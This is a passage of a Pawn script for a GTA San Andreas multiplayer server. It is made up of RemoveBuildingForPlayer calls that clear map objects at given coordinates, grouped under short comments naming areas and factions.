	RemoveBuildingForPlayer(playerid, 3371, -368.031, 1110.867, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3371, -298.054, 1120.859, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3371, -253.054, 1150.882, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3371, -248.039, 995.882, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3371, -18.054, 1120.859, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3371, 6.945, 1075.882, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3373, -253.054, 1175.882, 20.773, 0.250);
	RemoveBuildingForPlayer(playerid, 3373, -323.054, 1125.882, 20.773, 0.250);
	RemoveBuildingForPlayer(playerid, 3373, -38.031, 1075.882, 20.773, 0.250);
	RemoveBuildingForPlayer(playerid, 16618, -117.765, 1079.460, 22.218, 0.250);
	RemoveBuildingForPlayer(playerid, 3372, 6.953, 1120.851, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3372, -38.046, 1045.851, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3372, -253.062, 1125.875, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3372, -368.023, 1135.867, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3372, -273.039, 995.890, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3372, -298.023, 1170.867, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 16752, 14.976, 1225.554, 20.531, 0.250);
	RemoveBuildingForPlayer(playerid, 3304, -273.039, 995.890, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3305, -248.039, 995.882, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 1308, -234.953, 1007.625, 17.367, 0.250);
	RemoveBuildingForPlayer(playerid, 16738, -217.492, 1026.820, 27.679, 0.250);
	RemoveBuildingForPlayer(playerid, 1308, -204.414, 971.710, 17.367, 0.250);
	RemoveBuildingForPlayer(playerid, 1308, -206.500, 1000.906, 17.367, 0.250);
	RemoveBuildingForPlayer(playerid, 1308, -170.375, 977.898, 17.367, 0.250);
	RemoveBuildingForPlayer(playerid, 1308, -170.460, 1029.367, 18.734, 0.250);
	RemoveBuildingForPlayer(playerid, 1308, -286.140, 1053.234, 17.367, 0.250);
	RemoveBuildingForPlayer(playerid, 16061, -193.375, 1055.289, 18.320, 0.250);
	RemoveBuildingForPlayer(playerid, 700, -289.062, 1074.976, 19.015, 0.250);
	RemoveBuildingForPlayer(playerid, 3169, -152.882, 909.187, 17.851, 0.250);
	RemoveBuildingForPlayer(playerid, 3241, -120.867, 919.757, 19.476, 0.250);
	RemoveBuildingForPlayer(playerid, 3173, -151.078, 936.085, 18.273, 0.250);
	RemoveBuildingForPlayer(playerid, 3284, -95.343, 967.437, 20.710, 0.250);
	RemoveBuildingForPlayer(playerid, 3242, -130.375, 972.117, 20.640, 0.250);
	RemoveBuildingForPlayer(playerid, 1308, -165.562, 1000.765, 18.703, 0.250);
	RemoveBuildingForPlayer(playerid, 3285, -62.304, 968.398, 20.625, 0.250);
	RemoveBuildingForPlayer(playerid, 3173, -39.781, 962.617, 18.601, 0.250);
	RemoveBuildingForPlayer(playerid, 3283, -15.554, 968.734, 18.921, 0.250);
	RemoveBuildingForPlayer(playerid, 3304, -38.046, 1045.851, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 669, -51.687, 1042.593, 18.679, 0.250);
	RemoveBuildingForPlayer(playerid, 652, -51.148, 1052.109, 18.453, 0.250);
	RemoveBuildingForPlayer(playerid, 3303, -38.031, 1075.882, 20.773, 0.250);
	RemoveBuildingForPlayer(playerid, 700, -51.140, 1064.812, 19.015, 0.250);
	RemoveBuildingForPlayer(playerid, 773, 4.945, 1052.890, 14.546, 0.250);
	RemoveBuildingForPlayer(playerid, 3305, 6.945, 1075.882, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 773, -291.257, 1085.093, 17.656, 0.250);
	RemoveBuildingForPlayer(playerid, 3305, -368.031, 1110.867, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 780, -325.960, 1109.562, 18.500, 0.250);
	RemoveBuildingForPlayer(playerid, 669, -228.382, 1111.875, 18.828, 0.250);
	RemoveBuildingForPlayer(playerid, 774, -245.750, 1111.281, 17.945, 0.250);
	RemoveBuildingForPlayer(playerid, 3305, -298.054, 1120.859, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3303, -323.054, 1125.882, 20.773, 0.250);
	RemoveBuildingForPlayer(playerid, 3304, -253.062, 1125.875, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 16006, -215.234, 1119.195, 18.351, 0.250);
	RemoveBuildingForPlayer(playerid, 669, -225.312, 1127.210, 18.804, 0.250);
	RemoveBuildingForPlayer(playerid, 3304, -368.023, 1135.867, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 16740, -152.320, 1144.070, 30.304, 0.250);
	RemoveBuildingForPlayer(playerid, 3305, -253.054, 1150.882, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 16060, -192.046, 1147.390, 17.695, 0.250);
	RemoveBuildingForPlayer(playerid, 3304, -298.023, 1170.867, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3303, -253.054, 1175.882, 20.773, 0.250);
	RemoveBuildingForPlayer(playerid, 769, -232.359, 1174.476, 18.578, 0.250);
	RemoveBuildingForPlayer(playerid, 16065, -219.375, 1176.656, 22.164, 0.250);
	RemoveBuildingForPlayer(playerid, 16066, -186.484, 1217.625, 20.562, 0.250);
	RemoveBuildingForPlayer(playerid, 16781, -144.054, 1227.304, 18.898, 0.250);
	RemoveBuildingForPlayer(playerid, 16386, -117.765, 1079.460, 22.218, 0.250);
	RemoveBuildingForPlayer(playerid, 1308, -111.742, 1087.500, 19.484, 0.250);
	RemoveBuildingForPlayer(playerid, 780, -84.890, 1143.437, 18.421, 0.250);
	RemoveBuildingForPlayer(playerid, 652, -81.085, 1149.640, 18.453, 0.250);
	RemoveBuildingForPlayer(playerid, 16475, -98.195, 1180.070, 18.734, 0.250);
	RemoveBuildingForPlayer(playerid, 652, -26.742, 1080.171, 18.453, 0.250);
	RemoveBuildingForPlayer(playerid, 700, -5.218, 1112.570, 19.015, 0.250);
	RemoveBuildingForPlayer(playerid, 669, -13.296, 1112.265, 18.679, 0.250);
	RemoveBuildingForPlayer(playerid, 3304, 6.953, 1120.851, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 3305, -18.054, 1120.859, 21.671, 0.250);
	RemoveBuildingForPlayer(playerid, 652, 1.500, 1133.898, 17.773, 0.250);
	RemoveBuildingForPlayer(playerid, 773, -18.390, 1136.820, 18.460, 0.250);
	RemoveBuildingForPlayer(playerid, 700, 3.828, 1159.296, 19.015, 0.250);
	RemoveBuildingForPlayer(playerid, 16069, 12.117, 1178.539, 20.812, 0.250);
	RemoveBuildingForPlayer(playerid, 16442, -18.468, 1178.882, 29.375, 0.250);
	RemoveBuildingForPlayer(playerid, 16068, -32.523, 1185.187, 22.429, 0.250);
	RemoveBuildingForPlayer(playerid, 700, 19.828, 1085.398, 19.046, 0.250);
	RemoveBuildingForPlayer(playerid, 669, 17.140, 1136.593, 18.679, 0.250);
	RemoveBuildingForPlayer(playerid, 669, 30.492, 1157.789, 18.679, 0.250);
	RemoveBuildingForPlayer(playerid, 700, 22.257, 1158.476, 18.406, 0.250);
	RemoveBuildingForPlayer(playerid, 16562, 14.976, 1225.554, 20.531, 0.250);
	RemoveBuildingForPlayer(playerid, 16477, 55.562, 1220.679, 17.921, 0.250);
	RemoveBuildingForPlayer(playerid, 16479, 86.242, 1214.039, 17.742, 0.250);

	
	//jdls
	RemoveBuildingForPlayer(playerid, 5024, 1748.843, -1883.031, 14.187, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1774.757, -1901.539, 16.375, 0.250);
	RemoveBuildingForPlayer(playerid, 5033, 1745.203, -1882.851, 26.140, 0.250);


	//zone
	RemoveBuildingForPlayer(playerid, 16094, 191.1406, 1870.0391, 21.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 2889, 203.7408, 1883.5748, 39.8686, 150);
	RemoveBuildingForPlayer(playerid, 2888, 203.7408, 1883.5748, 39.8686, 150);
	RemoveBuildingForPlayer(playerid, 2887, 203.7408, 1883.5748, 39.8686, 150);
	
    RemoveBuildingForPlayer(playerid, 3366, 276.6563, 2023.7578, 16.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3366, 276.6563, 1989.5469, 16.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3366, 276.6563, 1955.7656, 16.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 16590, 199.3438, 1943.7891, 18.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 16619, 199.3359, 1943.8750, 18.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 16093, 211.6484, 1810.1563, 20.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 16638, 211.7266, 1809.1875, 18.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 3279, 262.0938, 1807.6719, 16.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 3279, 113.3828, 1814.4531, 16.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 16662, 212.1094, 1823.2969, 6.6094, 0.25);
	RemoveBuildingForPlayer(playerid, 16782, 210.3672, 1822.7422, 7.6016, 0.25);
	RemoveBuildingForPlayer(playerid, 3279, 165.9531, 1849.9922, 16.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 1697, 220.3828, 1835.3438, 23.2344, 0.25);
	RemoveBuildingForPlayer(playerid, 1697, 228.7969, 1835.3438, 23.2344, 0.25);
	RemoveBuildingForPlayer(playerid, 1697, 236.9922, 1835.3438, 23.2344, 0.25);
	RemoveBuildingForPlayer(playerid, 3279, 103.8906, 1901.1016, 16.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 16096, 120.5078, 1934.0313, 19.8281, 0.25);
	RemoveBuildingForPlayer(playerid, 16203, 199.3438, 1943.7891, 18.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 3279, 161.9063, 1933.0938, 16.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 16323, 199.3359, 1943.8750, 18.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 3279, 233.4297, 1934.8438, 16.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 3279, 267.0625, 1895.2969, 16.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 3268, 276.6563, 2023.7578, 16.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3268, 276.6563, 1989.5469, 16.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3268, 276.6563, 1955.7656, 16.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3497, 1624.7969, 2606.6094, 13.2656, 0.25);
	//lcn
	RemoveBuildingForPlayer(playerid, 7886, 1435.8750, 2773.7891, 9.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 7885, 1435.8750, 2773.7891, 9.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 7917, 1435.8750, 2773.7891, 9.8203, 0.25);
	//chern
	RemoveBuildingForPlayer(playerid, 3300, -1667.1094, 2551.0625, 86.1172, 0.25);
	RemoveBuildingForPlayer(playerid, 3285, -1667.1094, 2551.0625, 86.1172, 0.25);
	RemoveBuildingForPlayer(playerid, 672, -1661.3750, 2569.8828, 84.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 703, -1642.8750, 2534.1328, 83.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 3342, -634.5625, 1447.8281, 12.5469, 0.25);
	RemoveBuildingForPlayer(playerid, 3345, -648.9219, 1446.7188, 12.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 3343, -660.2422, 1446.4063, 12.5391, 0.25);
	RemoveBuildingForPlayer(playerid, 11565, -703.1250, 1460.5391, 24.7188, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, -684.5625, 1463.1563, 16.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 3168, -660.2422, 1446.4063, 12.5391, 0.25);
	RemoveBuildingForPlayer(playerid, 3172, -648.9219, 1446.7188, 12.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 3173, -634.5625, 1447.8281, 12.5469, 0.25);
	RemoveBuildingForPlayer(playerid, 700, -668.9609, 1453.0625, 13.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 652, -637.3828, 1464.2109, 12.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 652, -630.6563, 1458.3906, 12.2656, 0.25);

	/// YAKUZA
	
	///
	RemoveBuildingForPlayer(playerid, 11455, -1505.4609, 2539.4922, 56.7891, 0.25);
	//rifa/grove
	RemoveBuildingForPlayer(playerid, 1502, 2813.8984, -1165.9219, 1028.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2047, 2817.3125, -1170.9688, 1031.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 2300, 2818.6484, -1166.5078, 1028.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 2091, 2819.8047, -1165.6641, 1028.1641, 0.25);

	//ash
	RemoveBuildingForPlayer(playerid, 8229, 1142.0313, 1362.5000, 12.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 1278, 1157.0156, 1361.2266, 23.9375, 0.25);
	//turma
	RemoveBuildingForPlayer(playerid, 3682, 247.929, 1461.859, 33.414, 0.250);
	RemoveBuildingForPlayer(playerid, 3682, 192.273, 1456.125, 33.414, 0.250);
	RemoveBuildingForPlayer(playerid, 3682, 199.757, 1397.882, 33.414, 0.250);
	RemoveBuildingForPlayer(playerid, 3683, 133.742, 1356.992, 17.093, 0.250);
	RemoveBuildingForPlayer(playerid, 3683, 166.789, 1356.992, 17.093, 0.250);
	RemoveBuildingForPlayer(playerid, 3683, 166.789, 1392.156, 17.093, 0.250);
	RemoveBuildingForPlayer(playerid, 3683, 133.742, 1392.156, 17.093, 0.250);
	RemoveBuildingForPlayer(playerid, 3683, 166.789, 1426.914, 17.093, 0.250);
	RemoveBuildingForPlayer(playerid, 3683, 133.742, 1426.914, 17.093, 0.250);
	RemoveBuildingForPlayer(playerid, 3288, 221.570, 1374.968, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3289, 212.078, 1426.031, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3290, 218.257, 1467.539, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3291, 246.562, 1435.195, 9.687, 0.250);
	RemoveBuildingForPlayer(playerid, 3291, 246.562, 1410.539, 9.687, 0.250);
	RemoveBuildingForPlayer(playerid, 3291, 246.562, 1385.890, 9.687, 0.250);
	RemoveBuildingForPlayer(playerid, 3291, 246.562, 1361.242, 9.687, 0.250);
	RemoveBuildingForPlayer(playerid, 3290, 190.914, 1371.773, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3289, 183.742, 1444.867, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3289, 222.507, 1444.695, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3289, 221.179, 1390.296, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3288, 223.179, 1421.187, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3683, 133.742, 1459.640, 17.093, 0.250);
	RemoveBuildingForPlayer(playerid, 3289, 207.539, 1371.242, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3424, 220.648, 1355.187, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3424, 221.703, 1404.507, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3424, 210.414, 1444.843, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3424, 262.507, 1465.203, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3259, 220.648, 1355.187, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3636, 133.742, 1356.992, 17.093, 0.250);
	RemoveBuildingForPlayer(playerid, 3636, 166.789, 1356.992, 17.093, 0.250);
	RemoveBuildingForPlayer(playerid, 3256, 190.914, 1371.773, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 16392, 150.078, 1378.343, 11.843, 0.250);
	RemoveBuildingForPlayer(playerid, 3636, 166.789, 1392.156, 17.093, 0.250);
	RemoveBuildingForPlayer(playerid, 3636, 133.742, 1392.156, 17.093, 0.250);
	RemoveBuildingForPlayer(playerid, 3258, 207.539, 1371.242, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 205.648, 1394.132, 10.117, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 205.648, 1392.156, 16.296, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 205.648, 1394.132, 23.781, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 207.359, 1390.570, 19.148, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 206.507, 1387.851, 27.492, 0.250);
	RemoveBuildingForPlayer(playerid, 3673, 199.757, 1397.882, 33.414, 0.250);
	RemoveBuildingForPlayer(playerid, 3257, 221.570, 1374.968, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3258, 221.179, 1390.296, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 203.953, 1409.914, 16.296, 0.250);
	RemoveBuildingForPlayer(playerid, 3674, 199.382, 1407.117, 35.898, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 204.640, 1409.851, 11.406, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 206.507, 1404.234, 18.296, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 206.507, 1400.656, 22.468, 0.250);
	RemoveBuildingForPlayer(playerid, 3259, 221.703, 1404.507, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 207.359, 1409.000, 19.757, 0.250);
	RemoveBuildingForPlayer(playerid, 3257, 223.179, 1421.187, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3258, 212.078, 1426.031, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3636, 166.789, 1426.914, 17.093, 0.250);
	RemoveBuildingForPlayer(playerid, 3636, 133.742, 1426.914, 17.093, 0.250);
	RemoveBuildingForPlayer(playerid, 16391, 239.296, 1367.992, 11.835, 0.250);
	RemoveBuildingForPlayer(playerid, 3255, 246.562, 1361.242, 9.687, 0.250);
	RemoveBuildingForPlayer(playerid, 3255, 246.562, 1385.890, 9.687, 0.250);
	RemoveBuildingForPlayer(playerid, 3255, 246.562, 1410.539, 9.687, 0.250);
	RemoveBuildingForPlayer(playerid, 3258, 183.742, 1444.867, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3259, 210.414, 1444.843, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3258, 222.507, 1444.695, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 16086, 232.289, 1434.484, 13.500, 0.250);
	RemoveBuildingForPlayer(playerid, 16393, 149.375, 1452.937, 11.851, 0.250);
	RemoveBuildingForPlayer(playerid, 16394, 238.273, 1452.937, 11.835, 0.250);
	RemoveBuildingForPlayer(playerid, 3673, 192.273, 1456.125, 33.414, 0.250);
	RemoveBuildingForPlayer(playerid, 3674, 183.039, 1455.750, 35.898, 0.250);
	RemoveBuildingForPlayer(playerid, 3636, 133.742, 1459.640, 17.093, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 196.023, 1462.015, 10.117, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 198.000, 1462.015, 16.296, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 196.023, 1462.015, 23.781, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 180.242, 1460.320, 16.296, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 180.304, 1461.007, 11.406, 0.250);
	RemoveBuildingForPlayer(playerid, 3256, 218.257, 1467.539, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 199.585, 1463.726, 19.148, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 181.156, 1463.726, 19.757, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 185.921, 1462.875, 18.296, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 202.304, 1462.875, 27.492, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 189.500, 1462.875, 22.468, 0.250);
	RemoveBuildingForPlayer(playerid, 3255, 246.562, 1435.195, 9.687, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 254.679, 1451.828, 27.492, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 253.820, 1458.109, 23.781, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 255.531, 1454.546, 19.148, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 253.820, 1456.132, 16.296, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 253.820, 1458.109, 10.117, 0.250);
	RemoveBuildingForPlayer(playerid, 3259, 262.507, 1465.203, 9.585, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 254.679, 1468.210, 18.296, 0.250);
	RemoveBuildingForPlayer(playerid, 3673, 247.929, 1461.859, 33.414, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 254.679, 1464.632, 22.468, 0.250);
	RemoveBuildingForPlayer(playerid, 3674, 247.554, 1471.093, 35.898, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 255.531, 1472.976, 19.757, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 252.812, 1473.828, 11.406, 0.250);
	RemoveBuildingForPlayer(playerid, 3675, 252.125, 1473.890, 16.296, 0.250);
	RemoveBuildingForPlayer(playerid, 16089, 342.125, 1431.093, 5.273, 0.250);
	RemoveBuildingForPlayer(playerid, 16090, 315.773, 1431.093, 5.273, 0.250);
	RemoveBuildingForPlayer(playerid, 16091, 289.742, 1431.093, 5.273, 0.250);
	RemoveBuildingForPlayer(playerid, 16087, 358.679, 1430.453, 11.617, 0.250);
	RemoveBuildingForPlayer(playerid, 16088, 368.429, 1431.093, 5.273, 0.250);
	RemoveBuildingForPlayer(playerid, 16092, 394.156, 1431.093, 5.273, 0.250);
	RemoveBuildingForPlayer(playerid, 16766, 498.039, 1428.078, 7.164, 0.250);
	RemoveBuildingForPlayer(playerid, 16530, 414.289, 1496.226, 11.625, 0.250);
	RemoveBuildingForPlayer(playerid, 16532, 497.500, 1507.601, 5.250, 0.250);
	RemoveBuildingForPlayer(playerid, 16531, 465.492, 1552.093, 9.640, 0.250);
	RemoveBuildingForPlayer(playerid, 16534, 566.335, 1372.890, 12.179, 0.250);
	RemoveBuildingForPlayer(playerid, 16267, 638.601, 1404.992, 11.937, 0.250);
	RemoveBuildingForPlayer(playerid, 16533, 588.640, 1483.937, 8.937, 0.250);
	//gruz
	RemoveBuildingForPlayer(playerid, 8071, 1667.476, 723.085, 10.937, 0.250);
	RemoveBuildingForPlayer(playerid, 8087, 1667.742, 723.226, 21.093, 0.250);
	RemoveBuildingForPlayer(playerid, 8106, 1667.476, 723.085, 10.937, 0.250);
	RemoveBuildingForPlayer(playerid, 8113, 1665.171, 687.046, 14.390, 0.250);
	RemoveBuildingForPlayer(playerid, 8114, 1634.718, 772.843, 13.820, 0.250);
	RemoveBuildingForPlayer(playerid, 8115, 1695.492, 673.218, 13.820, 0.250);
	RemoveBuildingForPlayer(playerid, 8159, 1665.562, 753.828, 14.390, 0.250);
	RemoveBuildingForPlayer(playerid, 8254, 1665.171, 687.046, 14.390, 0.250);
	RemoveBuildingForPlayer(playerid, 8255, 1665.562, 753.828, 14.390, 0.250);
	RemoveBuildingForPlayer(playerid, 3459, 1576.476, 662.015, 17.085, 0.250);
	RemoveBuildingForPlayer(playerid, 1334, 1584.929, 663.984, 10.929, 0.250);
	RemoveBuildingForPlayer(playerid, 1335, 1581.093, 664.179, 10.945, 0.250);
	RemoveBuildingForPlayer(playerid, 1440, 1578.492, 667.984, 10.210, 0.250);
	RemoveBuildingForPlayer(playerid, 676, 1579.093, 683.562, 10.070, 0.250);
	RemoveBuildingForPlayer(playerid, 680, 1579.000, 687.718, 10.125, 0.250);
	RemoveBuildingForPlayer(playerid, 659, 1579.929, 695.078, 8.765, 0.250);
	RemoveBuildingForPlayer(playerid, 1215, 1577.835, 708.015, 10.156, 0.250);
	RemoveBuildingForPlayer(playerid, 1215, 1577.835, 718.523, 10.156, 0.250);
	RemoveBuildingForPlayer(playerid, 1215, 1579.835, 718.523, 10.156, 0.250);
	RemoveBuildingForPlayer(playerid, 1215, 1579.835, 708.015, 10.156, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1589.914, 671.945, 10.062, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1589.914, 669.117, 10.062, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1589.914, 674.843, 10.062, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1589.914, 677.664, 10.062, 0.250);
	RemoveBuildingForPlayer(playerid, 1421, 1620.632, 703.968, 10.500, 0.250);
	RemoveBuildingForPlayer(playerid, 3459, 1577.195, 725.015, 17.218, 0.250);
	RemoveBuildingForPlayer(playerid, 676, 1579.093, 733.562, 10.070, 0.250);
	RemoveBuildingForPlayer(playerid, 673, 1579.742, 729.007, 8.226, 0.250);
	RemoveBuildingForPlayer(playerid, 1412, 1580.039, 783.250, 11.093, 0.250);
	RemoveBuildingForPlayer(playerid, 1412, 1585.320, 783.250, 11.093, 0.250);
	RemoveBuildingForPlayer(playerid, 1412, 1590.593, 783.250, 11.093, 0.250);
	RemoveBuildingForPlayer(playerid, 1412, 1595.867, 783.250, 11.093, 0.250);
	RemoveBuildingForPlayer(playerid, 3459, 1577.859, 786.195, 17.242, 0.250);
	RemoveBuildingForPlayer(playerid, 1412, 1601.148, 783.250, 11.093, 0.250);
	RemoveBuildingForPlayer(playerid, 1412, 1606.421, 783.250, 11.093, 0.250);
	RemoveBuildingForPlayer(playerid, 1412, 1611.703, 783.250, 11.093, 0.250);
	RemoveBuildingForPlayer(playerid, 1412, 1616.976, 783.250, 11.093, 0.250);
	RemoveBuildingForPlayer(playerid, 1334, 1632.015, 663.984, 10.929, 0.250);
	RemoveBuildingForPlayer(playerid, 1334, 1634.679, 663.984, 10.929, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1648.546, 674.843, 10.062, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1648.546, 671.945, 10.062, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1648.546, 669.117, 10.062, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1648.546, 677.664, 10.062, 0.250);
	RemoveBuildingForPlayer(playerid, 1358, 1679.695, 767.429, 11.007, 0.250);
	RemoveBuildingForPlayer(playerid, 8078, 1634.718, 772.843, 13.820, 0.250);
	RemoveBuildingForPlayer(playerid, 1335, 1651.054, 774.804, 10.945, 0.250);
	RemoveBuildingForPlayer(playerid, 3459, 1683.796, 662.257, 16.648, 0.250);
	RemoveBuildingForPlayer(playerid, 8077, 1695.492, 673.218, 13.820, 0.250);
	RemoveBuildingForPlayer(playerid, 3459, 1683.796, 784.203, 16.648, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1709.054, 744.429, 10.914, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1709.054, 745.617, 10.468, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1709.054, 744.375, 10.062, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1709.187, 745.492, 11.359, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1709.054, 742.718, 10.468, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1709.054, 741.546, 10.062, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1709.054, 747.078, 10.914, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1709.054, 747.273, 10.062, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1709.054, 748.437, 10.468, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1709.054, 750.093, 10.062, 0.250);
	RemoveBuildingForPlayer(playerid, 1503, 1749.710, 776.437, 10.210, 0.250);
	RemoveBuildingForPlayer(playerid, 1440, 1754.593, 677.625, 10.210, 0.250);
	RemoveBuildingForPlayer(playerid, 3459, 1755.968, 660.757, 17.171, 0.250);
	RemoveBuildingForPlayer(playerid, 674, 1756.023, 723.007, 9.765, 0.250);
	RemoveBuildingForPlayer(playerid, 674, 1756.023, 719.578, 9.765, 0.250);
	RemoveBuildingForPlayer(playerid, 1358, 1756.031, 771.640, 10.984, 0.250);
	RemoveBuildingForPlayer(playerid, 1335, 1756.531, 684.968, 10.945, 0.250);
	RemoveBuildingForPlayer(playerid, 1440, 1756.421, 678.960, 10.210, 0.250);
	RemoveBuildingForPlayer(playerid, 1334, 1756.578, 691.164, 10.929, 0.250);
	RemoveBuildingForPlayer(playerid, 1334, 1756.578, 688.625, 10.929, 0.250);
	RemoveBuildingForPlayer(playerid, 3459, 1758.234, 725.664, 17.164, 0.250);
	RemoveBuildingForPlayer(playerid, 3459, 1757.976, 783.375, 17.218, 0.250);

	//huynya
	RemoveBuildingForPlayer(playerid, 11604, -1945.890, 2377.906, 48.695, 0.250);
	RemoveBuildingForPlayer(playerid, 11549, -1945.890, 2377.906, 48.695, 0.250);
	//==== 4 dragons
	RemoveBuildingForPlayer(playerid, 14620, 1957.9141, 991.8516, 991.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 14619, 1957.6797, 1043.9063, 991.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1968.7344, 1029.6641, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1967.4063, 1029.6563, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1968.7344, 1021.6875, 992.3125, 0.25);
